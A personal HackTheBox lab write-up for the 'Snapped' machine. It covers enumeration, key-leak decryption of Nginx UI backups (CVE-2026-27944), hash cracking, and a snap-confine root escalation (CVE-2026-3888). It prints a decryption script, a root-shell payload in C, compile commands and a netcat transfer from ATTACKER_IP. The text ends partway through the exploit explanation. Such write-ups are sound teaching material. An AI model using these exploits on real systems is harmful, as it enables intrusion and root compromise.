---
title: Snapped
date: 2026-05-17
excerpt: HackTheBox - Hard
cover: ../uploads/cover_snapped.jpg
tags: CVE-2026-27944, CVE-2026-3888
---

This is actually my first time documenting a HackTheBox machine, and I’ll be honest, HTB feels a lot more challenging compared to other platforms I’ve tried xD. The difficulty curve is definitely steeper, but that’s also what makes it fun and rewarding when things finally click.

In this post, I’ll walk through how I approached and solved the retired hard HTB machine **Snapped**. I’ll break down my thought process, the steps I took during enumeration and exploitation, and the key lessons I picked up along the way.

This writeup is meant to be both a learning guide and a personal note for myself, so I’ll try to keep things clear, practical, and easy to follow. Hopefully it also helps anyone who’s stuck on similar concepts or just getting started with HackTheBox.

Let’s dive in!

## Reconnaissance

Let’s start by scanning for open ports using `Nmap` to identify possible entry points and potential attack paths:

`nmap -A -T5 10.129.230.48`

![](https://kur0sh1r0.gitbook.io/ctf-writeups/~gitbook/image?url=https%3A%2F%2F271954773-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FYsivTjPn2jLXI0ZgVqeF%252Fuploads%252FpyLdRjPaKRk8VGV0mgQv%252FScreenshot%2520%282313%29.png%3Falt%3Dmedia%26token%3D4b555a69-16bc-4db5-a495-1537d0d6d3ca&width=768&dpr=3&quality=100&sign=63b8f469&sv=2)

As shown above, ports 22 and 80 are open. I also noticed that port 80 redirects to `snapped.htb`, so the next step is to map the domain by adding it to the `/etc/hosts` file along with the target IP address.

![](https://kur0sh1r0.gitbook.io/ctf-writeups/~gitbook/image?url=https%3A%2F%2F271954773-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FYsivTjPn2jLXI0ZgVqeF%252Fuploads%252F5STK8U2BqLwnMIBKFxGe%252FScreenshot%2520%282314%29.png%3Falt%3Dmedia%26token%3D7fed74a2-f686-403f-8ef0-b87a05257d19&width=768&dpr=3&quality=100&sign=af5966a2&sv=2)

When I visit the page, this is the result:

![](https://kur0sh1r0.gitbook.io/ctf-writeups/~gitbook/image?url=https%3A%2F%2F271954773-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FYsivTjPn2jLXI0ZgVqeF%252Fuploads%252FJW8oA75snhFrYqYEv1n9%252FScreenshot%2520%282317%29.png%3Falt%3Dmedia%26token%3Df19535b3-9ed4-4663-b3ce-01515c88aee2&width=768&dpr=3&quality=100&sign=a20bb6f7&sv=2)

While scrolling down, I came across the email address **contact@snapped.htb**, which could become useful in later steps of the exploitation process.

I attempted to brute-force subdirectories to discover any hidden endpoints, but nothing of value turned up.

Next, I proceeded to fuzz for subdomains using `fuff` to check if any additional subdomains could be discovered.

`ffuf -ac -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt -H 'Host:FUZZ.snapped.htb' -u http://10.129.230.48`

![](https://kur0sh1r0.gitbook.io/ctf-writeups/~gitbook/image?url=https%3A%2F%2F271954773-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FYsivTjPn2jLXI0ZgVqeF%252Fuploads%252FuBlsVUbPDlXiotsTu98p%252FScreenshot%2520%282315%29.png%3Falt%3Dmedia%26token%3D1edca399-a50e-4e27-b442-0c751cbe2c7f&width=768&dpr=3&quality=100&sign=f14e6007&sv=2)

Now, let’s add the `admin` subdomain to our `/etc/hosts` file so it properly resolves to the target IP.

![](https://kur0sh1r0.gitbook.io/ctf-writeups/~gitbook/image?url=https%3A%2F%2F271954773-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FYsivTjPn2jLXI0ZgVqeF%252Fuploads%252FhWL0RlMMP4CwDDC4ZhV5%252FScreenshot%2520%282316%29.png%3Falt%3Dmedia%26token%3D3d6cae8d-3959-4d95-b4f3-a2d0efb316fa&width=768&dpr=3&quality=100&sign=25771907&sv=2)

This is the interface of `admin.snapped.htb`

![](https://kur0sh1r0.gitbook.io/ctf-writeups/~gitbook/image?url=https%3A%2F%2F271954773-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FYsivTjPn2jLXI0ZgVqeF%252Fuploads%252FT35rEBbJ0paJERN8z3sJ%252FScreenshot%2520%282319%29.png%3Falt%3Dmedia%26token%3D710cdf98-08da-4017-b29a-0c1c698b6b12&width=768&dpr=3&quality=100&sign=c83f8918&sv=2)

This appears to be an `Nginx UI` login page, and as expected, there’s nothing I can do without valid credentials.

Now let’s check the technology stack using `curl` to gather more information from the response headers and page content.

`curl -v http://admin.snapped.htb`

![](https://kur0sh1r0.gitbook.io/ctf-writeups/~gitbook/image?url=https%3A%2F%2F271954773-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FYsivTjPn2jLXI0ZgVqeF%252Fuploads%252FZNVBfhcpySnkGJW8NJHD%252FScreenshot%2520%282320%29.png%3Falt%3Dmedia%26token%3D02b6e5d2-34f5-431b-b3ac-7ecba8b4624c&width=768&dpr=3&quality=100&sign=1f8c8a17&sv=2)

I inspected the traffic through the browser’s developer tools and noticed multiple API calls being made on page load, particularly to `/api` endpoints.

![](https://kur0sh1r0.gitbook.io/ctf-writeups/~gitbook/image?url=https%3A%2F%2F271954773-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FYsivTjPn2jLXI0ZgVqeF%252Fuploads%252FhCdKGJZIMYID6hSusIsj%252FScreenshot%2520%282321%29.png%3Falt%3Dmedia%26token%3D6eafb334-a9c6-45b8-afa3-fa5e386a9340&width=768&dpr=3&quality=100&sign=2778f602&sv=2)

![](https://kur0sh1r0.gitbook.io/ctf-writeups/~gitbook/image?url=https%3A%2F%2F271954773-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FYsivTjPn2jLXI0ZgVqeF%252Fuploads%252FenqG0xtAFUWrg2sWdGBd%252FScreenshot%2520%282322%29.png%3Falt%3Dmedia%26token%3Dcf219d40-e633-4e62-aae0-232676efb093&width=768&dpr=3&quality=100&sign=9fee9936&sv=2)

![](https://kur0sh1r0.gitbook.io/ctf-writeups/~gitbook/image?url=https%3A%2F%2F271954773-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FYsivTjPn2jLXI0ZgVqeF%252Fuploads%252F3xoG2XN2RWZ1VJLfSsUO%252FScreenshot%2520%282323%29.png%3Falt%3Dmedia%26token%3D59172501-9b86-47bd-adfb-1645d3895960&width=768&dpr=3&quality=100&sign=1cef0af8&sv=2)

Now my goal is to identify the version of `Nginx UI` in use, so I’ll start by inspecting the JavaScript files loaded on the main page:

`curl -sk http://admin.snapped.htb/ | grep -oP '(?:src=|href=)["''']\K[^"''']+' | grep -Ei '.js($|?)'`

![](https://kur0sh1r0.gitbook.io/ctf-writeups/~gitbook/image?url=https%3A%2F%2F271954773-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FYsivTjPn2jLXI0ZgVqeF%252Fuploads%252FhLDxgzTjf725a70qZcbd%252FScreenshot%2520%282324%29.png%3Falt%3Dmedia%26token%3Dbf2c87a3-ceb9-418e-9d47-af2440e7fc87&width=768&dpr=3&quality=100&sign=30d12668&sv=2)

Inside that file, I found two references to JavaScript files that begin with `version`.

`curl -skL http://admin.snapped.htb/assets/index-DoHxQupa.js | grep -oP 'version[-\w]*.js' | sort -u`

![](https://kur0sh1r0.gitbook.io/ctf-writeups/~gitbook/image?url=https%3A%2F%2F271954773-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FYsivTjPn2jLXI0ZgVqeF%252Fuploads%252FMcX0H7ke8UA84RyonC74%252FScreenshot%2520%282325%29.png%3Falt%3Dmedia%26token%3D0d1e7698-8768-46cf-b10c-bda7e232ea8a&width=768&dpr=3&quality=100&sign=8659de62&sv=2)

Now let’s take a closer look at those JavaScript files and get the version of Nginx UI.

![](https://kur0sh1r0.gitbook.io/ctf-writeups/~gitbook/image?url=https%3A%2F%2F271954773-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FYsivTjPn2jLXI0ZgVqeF%252Fuploads%252FftQbafFJ9mF7T2phbgrg%252FScreenshot%2520%282326%29.png%3Falt%3Dmedia%26token%3D4258e2a2-473d-44fb-b914-52c71857126f&width=768&dpr=3&quality=100&sign=7c3b35bc&sv=2)

As shown here, the Nginx UI version is `2.3.2`.

Next, I tried brute-forcing directories on `admin.snapped.htb`, but it didn’t return anything useful. After that, I appended `/api` to the URL to enumerate and view the available endpoints under that path.

![](https://kur0sh1r0.gitbook.io/ctf-writeups/~gitbook/image?url=https%3A%2F%2F271954773-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FYsivTjPn2jLXI0ZgVqeF%252Fuploads%252FpFIgaM2yzD9CGJ0pOFiJ%252FScreenshot%2520%282328%29.png%3Falt%3Dmedia%26token%3D559751f6-69fa-4c1a-ae72-dbaf1a5374b9&width=768&dpr=3&quality=100&sign=66337ae0&sv=2)

The most interesting endpoint here is `/backup`, so I decided to try accessing it using `curl`.

`curl http://admin.snapped.htb/api/backup`

![](https://kur0sh1r0.gitbook.io/ctf-writeups/~gitbook/image?url=https%3A%2F%2F271954773-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FYsivTjPn2jLXI0ZgVqeF%252Fuploads%252FD65AGJW2C5dAYorVUkRY%252FScreenshot%2520%282329%29.png%3Falt%3Dmedia%26token%3D1871d361-e2da-4cf2-bf3a-9eddb07e8906&width=768&dpr=3&quality=100&sign=20a8d51f&sv=2)

It returns a binary file, so the next step is to download it for further analysis.

`wget http://admin.snapped.htb/api/backup`

![](https://kur0sh1r0.gitbook.io/ctf-writeups/~gitbook/image?url=https%3A%2F%2F271954773-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FYsivTjPn2jLXI0ZgVqeF%252Fuploads%252FJO509SaBiMPrGv4VUQr2%252FScreenshot%2520%282330%29.png%3Falt%3Dmedia%26token%3Da55da8fa-857d-4829-a60a-db383185303e&width=768&dpr=3&quality=100&sign=f69d0991&sv=2)

It turns out to be a ZIP file, so let’s inspect its contents.

![](https://kur0sh1r0.gitbook.io/ctf-writeups/~gitbook/image?url=https%3A%2F%2F271954773-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FYsivTjPn2jLXI0ZgVqeF%252Fuploads%252Fmf4otdVs2o456luKjI5z%252FScreenshot%2520%282332%29.png%3Falt%3Dmedia%26token%3D03a0dc81-dda8-4108-a41c-f55a98f4a3b6&width=768&dpr=3&quality=100&sign=7871de2e&sv=2)

It contains two zip files and one txt file. Now let’s extract the contents of the backup archive.

![](https://kur0sh1r0.gitbook.io/ctf-writeups/~gitbook/image?url=https%3A%2F%2F271954773-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FYsivTjPn2jLXI0ZgVqeF%252Fuploads%252FfTdswaBwZDd0qF9MvZNm%252FScreenshot%2520%282335%29.png%3Falt%3Dmedia%26token%3Dc3ac8410-2115-4778-aacc-277834fd7cbf&width=768&dpr=3&quality=100&sign=66d63b84&sv=2)

Even though they have zip and txt extensions, all three files are detected as generic data. If they were properly structured ZIP archives, the `file` command would have recognized them as such. This suggests the contents are encrypted, causing them to appear as random, unidentifiable data.

This is where I got stuck for about an hour since I had no idea what algorithm was being used. I wasn’t sure if it was symmetric encryption either, and I also couldn’t figure out where the key might be stored.

Since this is still related to Nginx UI, I started looking for known vulnerabilities and CVEs affecting it. Considering this machine was released out of cycle, it’s very likely tied to a 2026 CVE.

## Exploitation

One CVE I've found is [CVE-2026-27944](https://nvd.nist.gov/vuln/detail/CVE-2026-27944).

According to NIST, **CVE-2026-27944** affects Nginx UI, a web-based interface for the Nginx server. In versions prior to **2.3.3**, the `/api/backup` endpoint can be accessed without authentication and leaks the encryption key needed to decrypt backup files through the `X-Backup-Security` response header. This flaw allows an unauthenticated attacker to download complete system backups containing sensitive information such as user credentials, session tokens, SSL private keys, and Nginx configuration files, and then decrypt them immediately. The vulnerability has been fixed in version 2.3.3.

From my earlier enumeration, I already noticed that `/api/backup` was accessible without authentication and that the downloaded content appeared encrypted. This aligns perfectly with the description, where the decryption key is exposed in the `X-Backup-Security` header of the response.

A write-up from [CVEReports](https://cvereports.com/reports/CVE-2026-27944) also explains the vulnerability in detail and demonstrates how it can be exploited.

The encryption key and IV are included in the `X-Backup-Security` response header, so I’ll use `curl` to retrieve and inspect them.

`curl http://admin.snapped.htb/api/backup -v -o backup.zip`

![](https://kur0sh1r0.gitbook.io/ctf-writeups/~gitbook/image?url=https%3A%2F%2F271954773-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FYsivTjPn2jLXI0ZgVqeF%252Fuploads%252FxHH1frPjZrgWrJMXHbnI%252FScreenshot%2520%282341%29.png%3Falt%3Dmedia%26token%3Dc3d21a1f-0af3-473d-a6ee-e504d319a878&width=768&dpr=3&quality=100&sign=b6144ff2&sv=2)

The header contains two `Base64-encoded` values separated by a “:”, and it appears to generate new values with each request.

This is the decryption script from the writeup of the vulnerability:

![](https://kur0sh1r0.gitbook.io/ctf-writeups/~gitbook/image?url=https%3A%2F%2F271954773-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FYsivTjPn2jLXI0ZgVqeF%252Fuploads%252Fr7J9kkC34nOWYCYAhY0c%252FScreenshot%2520%282376%29.png%3Falt%3Dmedia%26token%3Dcd4c35ee-c058-4bd6-a603-a22a2aafdb1f&width=768&dpr=3&quality=100&sign=1e463767&sv=2)

Now let's modify it to decrypt our 3 encrypted files.

```python
from Crypto.Cipher import AES
import base64
import os

# Base64 values (X-Backup-Security header)
key = base64.b64decode("+ltqeQaFm/F6XmAugRqTEc3fYvKN9h1HVzvFtKQg9o4=")
iv  = base64.b64decode("4R6JiLajtLbVJK0k+tyW8Q==")

files = [
    "hash_info.txt",
    "nginx-ui.zip",
    "nginx.zip"
]

def decrypt_file(path):
    with open(path, "rb") as f:
        ciphertext = f.read()

    cipher = AES.new(key, AES.MODE_CBC, iv)
    plaintext = cipher.decrypt(ciphertext)

    out = path + ".dec"

    with open(out, "wb") as f:
        f.write(plaintext)

    print(f"[+] Decrypted: {path} -> {out}")

for file in files:
    if os.path.exists(file):
        decrypt_file(file)
    else:
        print(f"[-] Missing: {file}")
```

Now let's decrypt the files:

`python3 dec.py`

![](https://kur0sh1r0.gitbook.io/ctf-writeups/~gitbook/image?url=https%3A%2F%2F271954773-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FYsivTjPn2jLXI0ZgVqeF%252Fuploads%252FxtrokLW8NrSdSiwVgBhQ%252FScreenshot%2520%282343%29.png%3Falt%3Dmedia%26token%3D1093bced-c072-4250-a231-848855b8e3ac&width=768&dpr=3&quality=100&sign=bcb4d0e&sv=2)

Let's check the `hash_info.txt`

And as you can see, our decryption works!! Now let's unzip the 2 remaining zip files.

`unzip nginx-ui.zip.dec -d nginx-ui && unzip nginx.zip.dec -d nginx`

![](https://kur0sh1r0.gitbook.io/ctf-writeups/~gitbook/image?url=https%3A%2F%2F271954773-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FYsivTjPn2jLXI0ZgVqeF%252Fuploads%252FMrz4uTgDI7T8K6lzW49U%252FScreenshot%2520%282345%29.png%3Falt%3Dmedia%26token%3D957caede-3597-4c1c-9dd1-0af3fa57964b&width=768&dpr=3&quality=100&sign=443b926b&sv=2)

Inside `nginx-ui`, I've found a database.db

![](https://kur0sh1r0.gitbook.io/ctf-writeups/~gitbook/image?url=https%3A%2F%2F271954773-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FYsivTjPn2jLXI0ZgVqeF%252Fuploads%252F2wpmKaO6hMoor0pINBMP%252FScreenshot%2520%282348%29.png%3Falt%3Dmedia%26token%3D3484555c-8b90-4a52-ac30-54e093e0d5f1&width=768&dpr=3&quality=100&sign=d7c7d5cb&sv=2)

It's a SQLite file, now let's inspect it.

`sqlite3 database.db`

Now let's list the tables

`.tables`

![](https://kur0sh1r0.gitbook.io/ctf-writeups/~gitbook/image?url=https%3A%2F%2F271954773-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FYsivTjPn2jLXI0ZgVqeF%252Fuploads%252FsoSzok0HyN7rItIyQWp5%252FScreenshot%2520%282349%29.png%3Falt%3Dmedia%26token%3D8e76049e-1693-4071-bfe3-e0f09f2c2841&width=768&dpr=3&quality=100&sign=b52d64fc&sv=2)

`.headers on`

Let's check the `users` table.

`select * from users;`

![](https://kur0sh1r0.gitbook.io/ctf-writeups/~gitbook/image?url=https%3A%2F%2F271954773-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FYsivTjPn2jLXI0ZgVqeF%252Fuploads%252Fs065oBcYmLx3PUIBM8SH%252FScreenshot%2520%282350%29.png%3Falt%3Dmedia%26token%3D28faef4a-3541-4888-b8a1-3cc6537c2c81&width=768&dpr=3&quality=100&sign=1ea8a090&sv=2)

There are two user accounts listed: **admin** and **jonathan**.

From the header, the hash is identified as **bcrypt**, and cracking it is relatively slow because bcrypt is deliberately designed to be computationally expensive and resistant to brute-force attacks through its adaptive cost factor. Now let’s proceed to crack it using `hashcat`.

`hashcat hash -m 3200 /usr/share/wordlists/rockyou.txt`

![](https://kur0sh1r0.gitbook.io/ctf-writeups/~gitbook/image?url=https%3A%2F%2F271954773-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FYsivTjPn2jLXI0ZgVqeF%252Fuploads%252FihGYTXyZzRhD3qyhCl8y%252FScreenshot%2520%282353%29.png%3Falt%3Dmedia%26token%3Da863ae4b-16ad-42c6-b2ff-bc53ed4af4a9&width=768&dpr=3&quality=100&sign=cddaba3e&sv=2)

It was cracked almost instantly since the password wasn’t very complex and appeared early in the wordlist.

Now let's login as `jonathan` using `ssh`

`ssh jonathan@snapped.htb`

![](https://kur0sh1r0.gitbook.io/ctf-writeups/~gitbook/image?url=https%3A%2F%2F271954773-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FYsivTjPn2jLXI0ZgVqeF%252Fuploads%252FXzTE8n9a02ri2cwQg8Sb%252FScreenshot%2520%282354%29.png%3Falt%3Dmedia%26token%3D0889e9f2-4eed-4f5a-a244-94c3c2aafbb8&width=768&dpr=3&quality=100&sign=cd7dcb4d&sv=2)

## Privilege Escalation

Next, I ran `linpeas` on the target machine, but it didn’t reveal anything useful. I also checked for common privilege escalation vectors such as scheduled tasks and cron jobs, but they all turned out to be dead ends. I ended up stuck at this stage for about an hour and a half with no clear path forward.

Then I realized the machine is named **“Snapped”**, which made me think that `snap` might be a relevant hint worth investigating further.

I also observed that the **Snapped** machine has several services running in the background.

`systemctl list-units --type=service --state=running 2>/dev/null`

![](https://kur0sh1r0.gitbook.io/ctf-writeups/~gitbook/image?url=https%3A%2F%2F271954773-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FYsivTjPn2jLXI0ZgVqeF%252Fuploads%252F0SJQSn1U33ZorrHzuxlG%252FScreenshot%2520%282358%29.png%3Falt%3Dmedia%26token%3D8e52e966-4b59-4a0f-af93-b5bb9d64f73a&width=768&dpr=3&quality=100&sign=a468453b&sv=2)

So I started looking for Snap-related CVEs that could potentially be leveraged for privilege escalation.

One CVE that got my attention is the [CVE-2026-3888](https://nvd.nist.gov/vuln/detail/CVE-2026-3888)

According to NIST, **CVE-2026-3888** is a local privilege escalation vulnerability in **snapd** on Linux systems. It allows a local attacker to gain root privileges by recreating Snap’s private `/tmp` directory in scenarios where `systemd-tmpfiles` is configured to periodically clean it. This issue impacts multiple Ubuntu LTS releases, including 16.04, 18.04, 20.04, 22.04, and 24.04.

The Ubuntu security advisory indicates that the vulnerability has been patched in Ubuntu 24.04 with snapd version **2.73**.

![](https://kur0sh1r0.gitbook.io/ctf-writeups/~gitbook/image?url=https%3A%2F%2F271954773-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FYsivTjPn2jLXI0ZgVqeF%252Fuploads%252FZrVX7DUzeRSnb9BwAHBS%252FScreenshot%2520%282363%29.png%3Falt%3Dmedia%26token%3Dff2e8965-f9be-4a00-a714-e022ace37c0a&width=768&dpr=3&quality=100&sign=27855945&sv=2)

![](https://kur0sh1r0.gitbook.io/ctf-writeups/~gitbook/image?url=https%3A%2F%2F271954773-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FYsivTjPn2jLXI0ZgVqeF%252Fuploads%252FEKLrQNBzxqjHUu2FLFDU%252FScreenshot%2520%282364%29.png%3Falt%3Dmedia%26token%3D1e8e690e-fa32-4fa9-a0c3-91caa34b9fa5&width=768&dpr=3&quality=100&sign=8f3d122d&sv=2)

I also came across a write-up from Qualys describing [CVE-2026-3888](https://blog.qualys.com/vulnerabilities-threat-research/2026/03/17/cve-2026-3888-important-snap-flaw-enables-local-privilege-escalation-to-root), it explains that the vulnerability arises from the interaction between two system components:

* **snap-confine**, which handles the secure execution environment for Snap applications with elevated privileges
* **systemd-tmpfiles**, which periodically removes temporary files and directories based on age thresholds

The exploitation path relies on timing and race conditions. First, the attacker waits for the system cleanup process (typically after 30 days on Ubuntu 24.04, or around 10 days in newer setups) to remove a critical directory used by snap-confine, such as `/tmp/.snap`. After this directory is deleted, the attacker recreates it and places malicious content inside. When snap-confine runs again during sandbox setup, it bind-mounts the attacker-controlled files with root privileges, effectively allowing arbitrary code execution as the root user.

It’s a bit more involved than it first appears. The `snap-confine` binary runs with SetUID root permissions, meaning it executes with elevated privileges even when triggered by a normal user. When a Snap application is launched, `snap-confine` sets up a controlled environment using a mount namespace to isolate the application.

As part of this setup, it prepares a writable structure inside `/tmp/.snap/` by copying parts of the filesystem, these are often called “mount shadows.” This allows Snap apps to behave as if they can write to protected system paths without actually modifying the real filesystem.

If `/tmp/.snap` has been removed (for example, by automatic cleanup tools like `systemd-tmpfiles`), `snap-confine` will recreate it. The weakness appears when an attacker manages to create `/tmp/.snap` beforehand and injects carefully crafted files into it. Since `snap-confine` runs as root, it may later reuse this attacker-controlled directory during mount setup, unintentionally giving the attacker influence over privileged operations.

A different way to abuse this kind of flaw is to replace a normally trusted configuration or preload file inside the recreated directory with a malicious shared library, such as a fake `libc.so.6`. When the privileged `snap-confine` process loads it during execution, the malicious code is executed with root permissions, resulting in full system compromise.

I looked for a proof-of-concept for this exploit, and the first result I found was from [TheCyberGeek](https://github.com/TheCyberGeek/CVE-2026-3888-snap-confine-systemd-tmpfiles-LPE).

This exploit takes advantage of a systemd timer that scans temporary directories for files and folders older than 30 days and removes them. In this case, the cleanup task is being executed every minute:

![](https://kur0sh1r0.gitbook.io/ctf-writeups/~gitbook/image?url=https%3A%2F%2F271954773-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FYsivTjPn2jLXI0ZgVqeF%252Fuploads%252FOyMWXDjji6SFWfFTtPmw%252FScreenshot%2520%282365%29.png%3Falt%3Dmedia%26token%3D205372a1-aa64-48a5-a68a-300136609387&width=768&dpr=3&quality=100&sign=e6479c1e&sv=2)

By default, this is set to 30 days, but in this case it has been reduced to just 4 minutes:

![](https://kur0sh1r0.gitbook.io/ctf-writeups/~gitbook/image?url=https%3A%2F%2F271954773-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FYsivTjPn2jLXI0ZgVqeF%252Fuploads%252FngNE2IuCmKPB508pf3BM%252FScreenshot%2520%282366%29.png%3Falt%3Dmedia%26token%3Df761fe06-d460-4723-80a0-7c1ee39baa76&width=768&dpr=3&quality=100&sign=8d55d931&sv=2)

To execute the exploit, I first need to clone the PoC scripts provided by TCG. There are two variants available: one designed for SetUID `snap-confine` systems, and another intended for `snap-confine` binaries that use capabilities instead. In the case of **Snapped**, it uses the SetUID model, which is consistent with the expected configuration for this operating system.

This is the payload named `librootshell_suid.c`:

```c
/*
 * librootshell.so — replaces ld-linux-x86-64.so.2
 * Calls setreuid(0,0) then execve(/tmp/sh)
 * Compile: gcc -nostdlib -static -o librootshell.so librootshell_suid.c
 */

void _start(void) {
    /* setreuid(0, 0) */
    __asm__ volatile (
        "xor %%rdi, %%rdi\n"
        "xor %%rsi, %%rsi\n"
        "mov $0x71, %%rax\n"   /* __NR_setreuid = 113 */
        "syscall\n"
        ::: "rax", "rdi", "rsi"
    );

    /* setregid(0, 0) */
    __asm__ volatile (
        "xor %%rdi, %%rdi\n"
        "xor %%rsi, %%rsi\n"
        "mov $0x72, %%rax\n"   /* __NR_setregid = 114 */
        "syscall\n"
        ::: "rax", "rdi", "rsi"
    );

    /* execve("/tmp/sh", {"/tmp/sh", NULL}, NULL) */
    __asm__ volatile (
        "mov $0x68732f706d742f, %%rax\n"  /* "/tmp/sh\0" */
        "push %%rax\n"
        "mov %%rsp, %%rdi\n"              /* path = "/tmp/sh" */
        "push $0\n"
        "push %%rdi\n"
        "mov %%rsp, %%rsi\n"              /* argv = {"/tmp/sh", NULL} */
        "xor %%rdx, %%rdx\n"              /* envp = NULL */
        "mov $0x3b, %%rax\n"              /* __NR_execve = 59 */
        "syscall\n"
        ::: "rax", "rdi", "rsi", "rdx"
    );
}
```

The payload operates at a very low level, effectively behaving like raw assembly since it replaces the dynamic linker itself. Because of this, it cannot rely on shared libraries, meaning the usual C standard library functions are unavailable.

Instead, it directly invokes system calls to achieve its goal: first elevating privileges by setting both the user and group IDs to root, and then launching a shell by executing `/tmp/sh` through `execve`.

Now let's compile the binaries in our machine.

`gcc -O2 -static -o exploit exploit_suid.c`

`gcc -nostdlib -static -Wl,--entry=_start -o librootshell.so librootshell_suid.c`

Now that the binaries are compiled, I’ll transfer them to the target machine using `netcat.`

**Receiver:**

`nc ATTACKER_IP 9001 > exploit`

**Sender:**

`nc -lvnp 9001 < exploit`

![](https://kur0sh1r0.gitbook.io/ctf-writeups/~gitbook/image?url=https%3A%2F%2F271954773-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FYsivTjPn2jLXI0ZgVqeF%252Fuploads%252FS34BtNIoY3EyoFonAPEy%252FScreenshot%2520%282368%29.png%3Falt%3Dmedia%26token%3Ddb8da89f-0a70-40b6-a591-fe651e668cde&width=768&dpr=3&quality=100&sign=eb9b86&sv=2)

Do this for both `exploit` and `librootshell.so`

Now let's make it executable

`chmod +x exploit`

`chmod +x librootshell.so`

Then execute.

`./exploit librootshell.so`

![](https://kur0sh1r0.gitbook.io/ctf-writeups/~gitbook/image?url=https%3A%2F%2F271954773-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FYsivTjPn2jLXI0ZgVqeF%252Fuploads%252FzFbcftxaG1OOuxtupqGZ%252FScreenshot%2520%282371%29.png%3Falt%3Dmedia%26token%3D8cae2630-5514-4b32-a8f1-7b50364b7149&width=768&dpr=3&quality=100&sign=a5b6b583&sv=2)

## Explanation Behind the Exploit (Pretty Long, Yeah)

The exploit doesn’t complete instantly, it unfolds over a few minutes in this lab environment, although in a real-world scenario it could take as long as 30 days. Here, the timeline is accelerated to about 4 minutes. The process runs automatically, but it can be broken down into seven distinct phases.

I execute the exploit by supplying the malicious payload library as an argument, which then begins the attack sequence. In the first stage, a sandboxed Firefox snap environment is launched, creating an internal shell instance. This shell operates within a restricted namespace, where paths like `/tmp` are actually redirected into Snap’s private directory structure. As a normal user, this location is inaccessible directly, but it can still be reached indirectly through `/proc` by referencing the process ID.

The second stage waits for the system cleanup mechanism to remove the `.snap` directory. Normally, this cleanup would only occur after a long delay, but in this environment it happens quickly due to a shortened timer. Once the directory is deleted, the exploit confirms the condition and proceeds.

Next, the exploit forces the system to discard cached mount namespaces. This is necessary because Snap would otherwise reuse an existing namespace and ignore newly introduced changes. By invalidating the cache, the next Snap launch must rebuild its environment from scratch, making it possible to influence the process.

